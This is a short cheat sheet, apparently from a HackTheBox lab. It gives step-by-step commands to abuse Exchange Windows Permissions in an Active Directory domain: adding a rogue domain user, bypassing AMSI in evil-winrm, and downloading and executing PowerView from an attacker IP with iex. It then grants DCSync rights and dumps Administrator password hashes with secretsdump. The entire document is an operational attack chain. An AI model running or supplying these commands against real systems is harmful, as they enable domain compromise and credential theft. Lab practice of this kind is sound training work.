# Exchange Windows Permissions

| Info                               | Command                                                                                           |
| ---------------------------------- | ------------------------------------------------------------------------------------------------- |
| Add a new user                     | `net user john abc123! /add /domain`                                                              |
| Add to the Exchange group          | `net group "Exchange Windows Permissions" john /add`                                              |
| Add to the remote management group | `net localgroup "Remote Management Users" john /add`                                              |
| Load evil-winrm menu               | `menu`                                                                                            |
| Enable AMSI Bypass                 | `Bypass-4MSI`                                                                                     |
| Download PowerView                 | `iex(new-object net.webclient).downloadstring('http://10.10.16.4/windows/privesc/PowerView.ps1')` |
| Create password object             | `$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force`                             |
| Create credentials object          | `$Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)`          |
| Give the user DCSync rights        | `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync`                          |
| Dump the administrator hashes      | `secretsdump.py htb.local/john@$ip -just-dc-user Administrator`                                   |
